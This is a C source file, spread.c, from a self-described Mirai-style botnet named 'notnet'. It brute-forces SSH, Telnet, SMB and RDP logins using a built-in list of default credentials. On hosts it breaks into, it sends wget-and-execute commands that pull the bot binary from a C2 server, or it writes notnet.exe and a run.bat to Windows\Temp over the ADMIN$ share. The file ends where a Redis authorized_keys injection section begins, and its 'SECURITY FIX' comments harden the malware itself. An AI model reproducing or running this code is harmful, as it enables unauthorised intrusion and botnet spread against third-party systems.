/*
 * notnet - Modern Mirai-Style Botnet
 * spread.c - Multi-vector spreading module
 *
 * Targets: SSH, Telnet, SMB, Redis, RDP
 */
#include "spread.h"
#include "util.h"
#include "protocol.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/select.h>

/* ── Default credentials ───────────────────────────────────── */
/* Mirai-style credential pool — can be extended via C2 */
static const char *default_users[] = {
    "admin", "root", "user", "test", "guest",
    "pi", "ubuntu", "deploy", "ftp", "www",
    "oracle", "postgres", "mysql", "mssql", "redis",
    "telnet", "default", "support", "info", "operator",
    NULL
};

static const char *default_passes[] = {
    "admin", "password", "123456", "root", "toor",
    "pass", "test", "guest", "12345", "1234",
    "123456789", "letmein", "welcome", "monkey", "qwerty",
    "abc123", "login", "default", "111111", "666666",
    "123", "123456789", "changeme", "123123", "password1",
    NULL
};

/* ── Helper ─────────────────────────────────────────────────── */
/* SECURITY FIX (#15): send_command now actually sends commands over an
 * open socket instead of just logging. For SSH/Telnet this sends the
 * command followed by a newline. */
static void send_command(int sock, const char *service, const char *cmd) {
    log_info("send_cmd: %s '%s'", service, cmd);
    if (sock >= 0) {
        char cmd_line[1024];
        int len = snprintf(cmd_line, sizeof(cmd_line), "%s\r\n", cmd);
        if (len < (int)sizeof(cmd_line)) {
            send(sock, cmd_line, len, 0);
        }
    }
}

/* ── Connection helpers ─────────────────────────────────────── */
static int create_connection(const char *ip, uint16_t port, int timeout_ms) {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    /* Set non-blocking for timeout */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    /* SECURITY FIX (#3): Use inet_pton + getaddrinfo fallback instead of
     * gethostbyname + memcpy (h_length overflow on IPv6 results).
     * SECURITY FIX (#54): Use getaddrinfo instead of inet_addr to avoid
     * accepting 255.255.255.255 as valid (inet_addr returns INADDR_NONE
     * for both error and that address). */
    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        struct addrinfo hints = {0}, *res;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        if (getaddrinfo(ip, NULL, &hints, &res) != 0) {
            close(sock);
            return -1;
        }
        struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
        addr.sin_addr = sin->sin_addr;
        freeaddrinfo(res);
    }
    
    int ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    /* Wait with timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }
    
    /* SECURITY FIX (#50): select() reports writability for refused
     * connections too. Check SO_ERROR to distinguish open ports from
     * RST/refused hosts — otherwise refused hosts are reported as open. */
    int so_error = 0;
    socklen_t slen = sizeof(so_error);
    if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &slen) != 0) {
        close(sock);
        return -1;
    }
    if (so_error != 0) {
        close(sock);
        return -1;
    }
    
    /* Restore blocking */
    fcntl(sock, F_SETFL, flags);
    return sock;
}

/* ── SSH Spreading ───────────────────────────────────────────── */
int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *pass) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;
    
    /* Read banner */
    char banner[256] = {0};
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, banner, sizeof(banner) - 1, 0);
        banner[sizeof(banner) - 1] = '\0';
    }
    
    /* SECURITY FIX (#33): banner is zero-initialized, so if select()
     * times out strstr() below sees an empty string, not stack garbage. */
    /* Check for SSH-2 banner (more secure than SSH-1) */
    if (strstr(banner, "SSH-2") == NULL) {
        close(sock);
        return -1;
    }
    
    /* Send SSH banner */
    char our_banner[256];
    snprintf(our_banner, sizeof(our_banner), "SSH-2.0-Notnet\r\n");
    send(sock, our_banner, strlen(our_banner), 0);
    
    /* Read server banner or prompt */
    char resp[256];
    memset(resp, 0, sizeof(resp));
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    select(sock + 1, &fds, NULL, NULL, &tv);
    recv(sock, resp, sizeof(resp) - 1, 0);
    
    /* Send username */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
    send(sock, cmd, strlen(cmd), 0);
    
    /* Read password prompt */
    memset(resp, 0, sizeof(resp));
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    select(sock + 1, &fds, NULL, NULL, &tv);
    recv(sock, resp, sizeof(resp) - 1, 0);
    
    /* Send password */
    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
    send(sock, cmd, strlen(cmd), 0);
    
    /* Read response */
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    
    int success = 0;
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        memset(resp, 0, sizeof(resp));
        recv(sock, resp, sizeof(resp) - 1, 0);
        resp[sizeof(resp) - 1] = '\0';
        /* Check for successful login indicators */
        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "Welcome")) {
            success = 1;
        }
    }
    
    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
    if (success) return sock;
    close(sock);
    return -1;
}

/* Timeout-aware SSH login — uses provided timeout_ms instead of SCAN_TIMEOUT_MS.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int try_login_ssh_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    /* Read banner */
    char banner[256];
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;

    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, banner, sizeof(banner) - 1, 0);
        banner[sizeof(banner) - 1] = '\0';
    }

    /* Check for SSH-2 banner (more secure than SSH-1) */
    if (strstr(banner, "SSH-2") == NULL) {
        close(sock);
        return -1;
    }

    /* Send SSH banner */
    char our_banner[256];
    snprintf(our_banner, sizeof(our_banner), "SSH-2.0-Notnet\r\n");
    send(sock, our_banner, strlen(our_banner), 0);

    /* Read server banner or prompt */
    char resp[256];
    memset(resp, 0, sizeof(resp));
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    select(sock + 1, &fds, NULL, NULL, &tv);
    recv(sock, resp, sizeof(resp) - 1, 0);

    /* Send username */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
    send(sock, cmd, strlen(cmd), 0);

    /* Read password prompt */
    memset(resp, 0, sizeof(resp));
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    select(sock + 1, &fds, NULL, NULL, &tv);
    recv(sock, resp, sizeof(resp) - 1, 0);

    /* Send password */
    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
    send(sock, cmd, strlen(cmd), 0);

    /* Read response */
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;

    int success = 0;
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        memset(resp, 0, sizeof(resp));
        recv(sock, resp, sizeof(resp) - 1, 0);
        resp[sizeof(resp) - 1] = '\0';
        /* Check for successful login indicators */
        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "Welcome")) {
            success = 1;
        }
    }

    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
    if (success) return sock;
    close(sock);
    return -1;
}

int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
int try_login_smb_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
int try_login_rdp_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms);
int scan_port_with_timeout(const char *ip, uint16_t port, int timeout_ms);
char *scan_ports(const char *target, uint16_t *ports, int port_count);

/* Forward declarations for static functions defined later */
static int smb1_negotiate(int sock);
static int smb1_session_setup(int sock, const char *user, const char *pass, uint16_t *out_uid);
static int rdp_connect(int sock);
static int rdp_send_cred_key_exchange(int sock, const char *user, const char *pass);
static int rdp_read_cred_response(int sock);
static int rdp_send_final_control(int sock);
static int rdp_read_final_control_response(int sock);
static int rdp_send_share_key(int sock);

int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->ssh_enabled) return -1;
    
    log_info("SSH: brute-forcing %s:%d", ip, port);
    
    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    /* Try default credentials */
    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock_fd = try_login_ssh_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
            if (sock_fd >= 0) {
                log_info("SSH: cracked %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                
                /* Download and install binary */
                char cmd[1024];
                char dl_url[1024];
                snprintf(dl_url, sizeof(dl_url),
                    "http://%.250s:%d/bot/%s",
                    bot->c2_http.server, PAYLOAD_DL_PORT, "notnet");
                /* %.500s: dl_url is already capped at ~280 bytes by the
                 * .250s precision above, but GCC can't see through the
                 * intermediate buffer, so cap again to silence truncation. */
                snprintf(cmd, sizeof(cmd),
                    "wget %.500s -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
                    dl_url);
                /* SECURITY FIX (#15): Send command over the established socket */
                send_command(sock_fd, "ssh", cmd);
                close(sock_fd);
                return 0;
            }
        }
    }
    
    return -1;
}

/* ── Telnet Spreading ─────────────────────────────────────── */
int try_login_telnet(const char *ip, uint16_t port, const char *user, const char *pass) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;
    
    /* SECURITY FIX (#33): zero-initialize banner so a select() timeout
     * leaves an empty string, never stack garbage fed to later strstr(). */
    char banner[256] = {0};
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, banner, sizeof(banner) - 1, 0);
        banner[sizeof(banner) - 1] = '\0';
    }
    
    /* Send username */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
    send(sock, cmd, strlen(cmd), 0);
    
    /* Read prompt */
    char resp[256];
    memset(resp, 0, sizeof(resp));
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        memset(resp, 0, sizeof(resp));
        recv(sock, resp, sizeof(resp) - 1, 0);
    }
    
    /* Send password */
    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
    send(sock, cmd, strlen(cmd), 0);
    
    /* Read response */
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;
    
    int success = 0;
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        memset(resp, 0, sizeof(resp));
        recv(sock, resp, sizeof(resp) - 1, 0);
        resp[sizeof(resp) - 1] = '\0';
        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "OK")) {
            success = 1;
        }
    }
    
    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
    if (success) return sock;
    close(sock);
    return -1;
}

/* Timeout-aware telnet login — uses provided timeout_ms.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int try_login_telnet_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    char banner[256];
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 1;
    tv.tv_usec = 0;

    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        recv(sock, banner, sizeof(banner) - 1, 0);
    }

    /* Send username */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "%s\r\n", user);
    send(sock, cmd, strlen(cmd), 0);

    /* Read prompt */
    char resp[256];
    memset(resp, 0, sizeof(resp));
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;

    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        memset(resp, 0, sizeof(resp));
        recv(sock, resp, sizeof(resp) - 1, 0);
    }

    /* Send password */
    snprintf(cmd, sizeof(cmd), "%s\r\n", pass);
    send(sock, cmd, strlen(cmd), 0);

    /* Read response */
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 2;
    tv.tv_usec = 0;

    int success = 0;
    if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
        memset(resp, 0, sizeof(resp));
        recv(sock, resp, sizeof(resp) - 1, 0);
        resp[sizeof(resp) - 1] = '\0';
        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, "OK")) {
            success = 1;
        }
    }

    /* SECURITY FIX (#15): Return socket fd on success instead of closing */
    if (success) return sock;
    close(sock);
    return -1;
}

/* Timeout-aware SMB login — uses provided timeout_ms.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int try_login_smb_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    /* SMB1 negotiation */
    if (smb1_negotiate(sock) <= 0) {
        close(sock);
        return -1;
    }

    /* Session setup with credentials */
    uint16_t uid = 0;
    if (smb1_session_setup(sock, user, pass, &uid) != 0) {
        close(sock);
        return -1;
    }

    log_info("SMB: session established as uid=%d", uid);
    return sock;
}

/* Timeout-aware RDP login — uses provided timeout_ms.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int try_login_rdp_with_timeout(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    /* Full RDP handshake */
    if (rdp_connect(sock) != 0) {
        close(sock);
        return -1;
    }

    /* Send credentials with key exchange */
    if (rdp_send_cred_key_exchange(sock, user, pass) <= 0) {
        close(sock);
        return -1;
    }

    /* Read auth response */
    if (rdp_read_cred_response(sock) <= 0) {
        close(sock);
        return -1;
    }

    /* Final control */
    if (rdp_send_final_control(sock) <= 0) {
        close(sock);
        return -1;
    }

    if (rdp_read_final_control_response(sock) <= 0) {
        close(sock);
        return -1;
    }

    /* Share key */
    rdp_send_share_key(sock);

    log_info("RDP: authenticated to %s:%d as %s", ip, port, user);
    return sock;
}

/* Timeout-aware port scan — uses provided timeout_ms.
 * SECURITY FIX (#63): Threads scan_timeout_ms through to create_connection. */
int scan_port_with_timeout(const char *ip, uint16_t port, int timeout_ms) {
    int sock = create_connection(ip, port, timeout_ms);
    if (sock < 0) return -1;

    close(sock);

    return 0;
}

int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->telnet_enabled) return -1;

    log_info("Telnet: brute-forcing %s:%d", ip, port);

    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock_fd = try_login_telnet_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
            if (sock_fd >= 0) {
                log_info("Telnet: cracked %s:%d with %s:%s",
                         ip, port, default_users[u], "***REDACTED***");
                
                char cmd[512];
                snprintf(cmd, sizeof(cmd),
                    "wget http://%s:%d/bot/notnet -O /tmp/.notnet && chmod +x /tmp/.notnet && /tmp/.notnet &",
                    bot->c2_http.server, PAYLOAD_DL_PORT);
                /* SECURITY FIX (#15): Send command over the established socket */
                send_command(sock_fd, "telnet", cmd);
                close(sock_fd);
                return 0;
            }
        }
    }
    
    return -1;
}

/* ── SMB Spreading ────────────────────────────────────────── */

/* ── SMB1 Protocol Helpers ────────────────────────────────── */
/* SMB1 over TCP port 445 (no NetBIOS session layer).
 * Header: 0xFF 0x53 0x4D 0x42 (4 bytes) + 32-byte SMB header. */

/* Build SMB1 header (32 bytes after protocol prefix) */
static void smb1_build_header(uint8_t *buf, uint8_t cmd, uint16_t uid, uint16_t mid) {
    buf[0] = 0xFF; /* Protocol prefix */
    buf[1] = 0x53; /* SMB */
    buf[2] = 0x4D;
    buf[3] = 0x42;

    buf[4] = cmd;  /* Command */
    buf[5] = 0x18; /* Flags: canonical path cases, case sensitive */
    buf[6] = 0x00;
    buf[7] = 0x00; /* Flags2: 16-bit PID, long names supported */
    buf[8] = 0x01;
    buf[9] = 0x00;
    buf[10] = 0x00;
    buf[11] = 0x00;
    buf[12] = 0x00;
    buf[13] = 0x00;
    buf[14] = 0x00;
    buf[15] = 0x00; /* Security features (8 bytes, zeroed) */
    buf[16] = 0x00;
    buf[17] = 0x00;
    buf[18] = 0x00;
    buf[19] = 0x00;
    buf[20] = 0x00;
    buf[21] = 0x00;
    buf[22] = 0x00;
    buf[23] = 0x00;
    buf[24] = 0x00;
    buf[25] = 0x00; /* PID high (2 bytes) */
    buf[26] = 0x00;
    buf[27] = 0x00; /* PID low (2 bytes) */
    buf[28] = 0x00;
    buf[29] = uid & 0xFF;  /* UID low */
    buf[30] = (uid >> 8) & 0xFF; /* UID high */
    buf[31] = mid & 0xFF;  /* MID low */
    buf[32] = (mid >> 8) & 0xFF; /* MID high */
}

/* Send SMB1 packet and read response. Returns bytes received, -1 on error. */
static int smb1_transaction(int sock, uint8_t *params, int param_len,
                            uint8_t *data, int data_len,
                            uint8_t *resp_buf, int resp_buf_size,
                            uint16_t uid, uint16_t mid) {
    /* Total packet: 4-byte prefix + 32-byte header + params + data */
    int total = 36 + param_len + data_len;
    uint8_t *packet = (uint8_t *)malloc(total);
    if (!packet) return -1;

    /* Build header */
    smb1_build_header(packet, 0, uid, mid);

    /* Copy params and data after header */
    if (param_len > 0) memcpy(packet + 36, params, param_len);
    if (data_len > 0) memcpy(packet + 36 + param_len, data, data_len);

    /* Send */
    int sent = send(sock, packet, total, 0);
    if (sent <= 0) {
        free(packet);
        return -1;
    }
    free(packet);

    /* Read response header first (4 bytes prefix + at least 32 header) */
    int received = recv(sock, resp_buf, 4, 0);
    if (received != 4 || resp_buf[0] != 0xFF) return -1;

    /* Read rest of header */
    int remaining = 32;
    int offset = 4;
    while (remaining > 0) {
        int n = recv(sock, resp_buf + offset, remaining, 0);
        if (n <= 0) return -1;
        offset += n;
        remaining -= n;
    }

    /* Read params and data based on response length fields */
    /* SMB1 response: word count at offset 36, byte count at offset 38 (LE) */
    if (offset < 38) return -1;

    /* For simplicity, read remaining data with timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 5;
    tv.tv_usec = 0;

    int max_read = resp_buf_size - offset;
    if (max_read > 0) {
        select(sock + 1, &fds, NULL, NULL, &tv);
        int n = recv(sock, resp_buf + offset, max_read, 0);
        if (n > 0) offset += n;
    }

    return offset;
}

/* SMB1 negotiation — returns 0 on success */
static int smb1_negotiate(int sock) {
    /* SMB_COM_NEGOTIATE: word count = 0, no params, no data */
    uint8_t params[2] = {0, 0}; /* Word count = 0, padding */
    /* Byte count = 0 */
    return smb1_transaction(sock, params, 2, NULL, 0, NULL, 0, 0, 1);
}

/* SMB1 session setup with username/password (ASCII) */
static int smb1_session_setup(int sock, const char *user, const char *pass,
                               uint16_t *out_uid) {
    /* SMB_COM_SESSION_SETUP_ANDX:
     * Word count: 12 (0x0C)
     * Max buffer, max mux, vcid, password length, account name, primary group
     * Then: Native OS string, native language, password, account name, primary group */

    /* Build parameters */
    uint8_t params[24] = {
        0x12, /* Word count = 18 */
        0xFF, /* AndX command = no further command */
        0x00, /* Reserved */
        0x00, 0x00, /* AndX offset */
        0x00, 0x00, 0x00, 0x00, /* Max buffer (4 bytes) */
        0x00, 0x00, 0x00, 0x00, /* Max MUX (4 bytes) */
        0x00, 0x00, /* VCID */
    };

    /* Password length (2 bytes LE) */
    int pass_len = strlen(pass);
    params[12] = pass_len & 0xFF;
    params[13] = (pass_len >> 8) & 0xFF;

    /* Account name length */
    int user_len = strlen(user);
    params[14] = user_len & 0xFF;
    params[15] = (user_len >> 8) & 0xFF;

    /* Primary group length */
    params[16] = 0;
    params[17] = 0;

    /* Native OS: "Linux" */
    /* Native language: 0x0000 */

    /* Data section */
    char data[512];
    int dpos = 0;

    /* Password (null-terminated) */
    memcpy(data + dpos, pass, pass_len);
    dpos += pass_len;
    data[dpos++] = 0; /* null terminator */

    /* Account name (null-terminated) */
    memcpy(data + dpos, user, user_len);
    dpos += user_len;
    data[dpos++] = 0;

    /* Primary group (null-terminated) */
    data[dpos++] = 0;

    /* Native OS string (null-terminated) */
    const char *native_os = "Linux";
    int os_len = strlen(native_os);
    memcpy(data + dpos, native_os, os_len);
    dpos += os_len;
    data[dpos++] = 0;

    /* Native language (2 bytes LE, 0x0000 = English) */
    data[dpos++] = 0x00;
    data[dpos++] = 0x00;

    int total_data = dpos;

    uint8_t resp[512];
    memset(resp, 0, sizeof(resp));

    int ret = smb1_transaction(sock, params, sizeof(params),
                                (uint8_t *)data, total_data, resp, sizeof(resp), 0, 2);

    if (ret > 36) {
        /* Extract UID from response (offset 30-31 in SMB header) */
        *out_uid = resp[30] | (resp[31] << 8);
        return 0;
    }
    return -1;
}

/* SMB1 tree connect to a share */
static int smb1_tree_connect(int sock, const char *path, uint16_t uid,
                              uint16_t *out_tid) {
    /* SMB_COM_TREE_CONNECT:
     * Word count: 4
     * AndX command, reserved, max reply, ftqos, patqos
     * Then: flags(LE), password length, password, path, service */

    uint8_t params[12] = {
        0x04, /* Word count */
        0xFF, /* AndX = none */
        0x00, /* Reserved */
        0x00, 0x00, /* Max reply */
        0x01, 0x00, 0x00, 0x00, /* FTQOS, PATQOS */
    };

    /* Data: flags LE, password len LE, password, path, service */
    char data[512];
    int dpos = 0;

    /* Flags: 0x0008 = password mode */
    data[dpos++] = 0x08;
    data[dpos++] = 0x00;

    /* Password length */
    data[dpos++] = 0x00;
    data[dpos++] = 0x00;

    /* Password (empty for most SMB shares) */
    data[dpos++] = 0;

    /* Path (null-terminated, uppercase for Windows shares) */
    /* Convert path to uppercase */
    char upper_path[256];
    strncpy(upper_path, path, sizeof(upper_path) - 1);
    upper_path[sizeof(upper_path) - 1] = '\0';
    for (int i = 0; upper_path[i]; i++) {
        if (upper_path[i] >= 'a' && upper_path[i] <= 'z') {
            upper_path[i] = upper_path[i] - 'a' + 'A';
        }
    }
    int path_len = strlen(upper_path);
    memcpy(data + dpos, upper_path, path_len);
    dpos += path_len;
    data[dpos++] = 0;

    /* Service: "DISK" */
    const char *service = "DISK";
    int svc_len = strlen(service);
    memcpy(data + dpos, service, svc_len);
    dpos += svc_len;
    data[dpos++] = 0;

    uint8_t resp[512];
    memset(resp, 0, sizeof(resp));

    int ret = smb1_transaction(sock, params, sizeof(params),
                                (uint8_t *)data, dpos, resp, sizeof(resp), uid, 3);

    if (ret > 36) {
        /* TID is at offset 28-29 in SMB header */
        *out_tid = resp[28] | (resp[29] << 8);
        return 0;
    }
    return -1;
}

/* SMB1 write to file */
static int smb1_write_file(int sock, uint16_t /* tid */, uint16_t uid, uint16_t mid,
                            const char *fname, const uint8_t *data, int data_len) {
    /* SMB_COM_WRITE_ANDX: write to file by name */
    /* Word count: 14 */
    uint8_t params[28] = {
        0x0E, /* Word count */
        0xFF, /* AndX = none */
        0x00, /* Reserved */
        0x00, 0x00, /* AndX offset */
        0x00, 0x00, 0x00, 0x00, /* File handle (4 bytes) */
        0x00, 0x00, /* Offset (2 bytes) */
    };

    /* Data section */
    char data_section[1024];
    int dpos = 0;

    /* Remaining (2 bytes LE) */
    data_section[dpos++] = data_len & 0xFF;
    data_section[dpos++] = (data_len >> 8) & 0xFF;

    /* Open mode (2 bytes) */
    data_section[dpos++] = 0x01; /* Overwrite if exists */
    data_section[dpos++] = 0x00;

    /* Write offset (4 bytes LE) */
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;

    /* Write timeout (4 bytes LE) */
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;
    data_section[dpos++] = 0x00;

    /* Remaining (2 bytes) */
    data_section[dpos++] = data_len & 0xFF;
    data_section[dpos++] = (data_len >> 8) & 0xFF;

    /* File name (DOS format, null-terminated) */
    char dos_fname[256];
    strncpy(dos_fname, fname, sizeof(dos_fname) - 1);
    dos_fname[sizeof(dos_fname) - 1] = '\0';
    for (int i = 0; dos_fname[i]; i++) {
        if (dos_fname[i] >= 'a' && dos_fname[i] <= 'z') {
            dos_fname[i] = dos_fname[i] - 'a' + 'A';
        }
    }
    int fn_len = strlen(dos_fname);
    memcpy(data_section + dpos, dos_fname, fn_len);
    dpos += fn_len;
    data_section[dpos++] = 0;

    /* Actual data to write */
    memcpy(data_section + dpos, data, data_len);
    dpos += data_len;

    int ret = smb1_transaction(sock, params, sizeof(params),
                                (uint8_t *)data_section, dpos, NULL, 0, uid, mid);
    return (ret > 36) ? 0 : -1;
}

/* SMB upload payload and deploy to Windows share */
static int smb_deploy_payload(int sock, uint16_t tid, uint16_t uid, uint16_t mid,
                               notnet_bot_t *bot, const char *ip) {
    /* Download payload to temp file */
    char dl_url[512];
    char tmp_path[256];
    snprintf(dl_url, sizeof(dl_url),
             "http://%s:%d/bot/notnet",
             bot->c2_http.server, PAYLOAD_DL_PORT);
    snprintf(tmp_path, sizeof(tmp_path), "/tmp/.notnet_smb.%s", ip);

    int fsize = http_download(bot, dl_url, tmp_path);
    if (fsize <= 0) {
        log_error("SMB: download failed for %s", ip);
        return -1;
    }

    /* Read payload into memory */
    unsigned char *payload = NULL;
    int actual_size = file_read(tmp_path, &payload);
    unlink(tmp_path);

    if (actual_size <= 0 || !payload) {
        log_error("SMB: read payload failed for %s", ip);
        return -1;
    }

    /* Write payload to Windows share */
    int ret = smb1_write_file(sock, tid, uid, mid,
                               "\\Windows\\Temp\\notnet.exe",
                               payload, actual_size);

    free(payload);

    if (ret == 0) {
        /* Execute it */
        char exec_cmd[256];
        snprintf(exec_cmd, sizeof(exec_cmd),
                 "cmd.exe /c start /b C:\\Windows\\Temp\\notnet.exe");
        ret = smb1_write_file(sock, tid, uid, mid,
                               "\\Windows\\Temp\\run.bat",
                               (const uint8_t *)exec_cmd, strlen(exec_cmd));
    }

    return ret;
}


int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass) {
    int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
    if (sock < 0) return -1;

    /* SMB1 negotiation */
    if (smb1_negotiate(sock) <= 0) {
        close(sock);
        return -1;
    }

    /* Session setup with credentials */
    uint16_t uid = 0;
    if (smb1_session_setup(sock, user, pass, &uid) != 0) {
        close(sock);
        return -1;
    }

    log_info("SMB: session established as uid=%d", uid);
    return sock;
}

int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
    if (!bot->smb_enabled) return -1;

    log_info("SMB: brute-forcing %s:%d", ip, port);

    /* Use config timeout, fall back to compile-time default */
    int timeout = SCAN_TIMEOUT_MS;
    if (bot->scan_timeout_ms > 0) timeout = (int)bot->scan_timeout_ms;

    for (int u = 0; default_users[u]; u++) {
        for (int p = 0; default_passes[p]; p++) {
            int sock = try_login_smb_with_timeout(ip, port, default_users[u], default_passes[p], timeout);
            if (sock < 0) continue;

            log_info("SMB: cracked %s:%d with %s:%s",
                     ip, port, default_users[u], "***REDACTED***");

            /* Session UID from try_login_smb */
            uint16_t uid = 0;

            /* Tree connect to ADMIN$ */
            uint16_t tid = 0;
            if (smb1_tree_connect(sock, "\\\\127.0.0.1\\ADMIN$", uid, &tid) != 0) {
                close(sock);
                continue;
            }

            /* Deploy payload */
            int ret = smb_deploy_payload(sock, tid, uid, tid + 1, bot, ip);

            if (ret == 0) {
                log_info("SMB: payload deployed on %s", ip);
            } else {
                log_warn("SMB: payload deploy failed on %s", ip);
            }

            close(sock);
            return ret;
        }
    }

    return -1;
}

/* ── Redis Spreading ───────────────────────────────────────── */
/* SECURITY FIX (#72): The SSH public key injected into Redis
 * authorized_keys must be provisioned per-deployment via the
 * redis_ssh_key config key or NOTNET_REDIS_SSH_KEY env var.
 * The old code injected a literal "ssh-rsa AAAAB3NzaC1...notnet-key..."
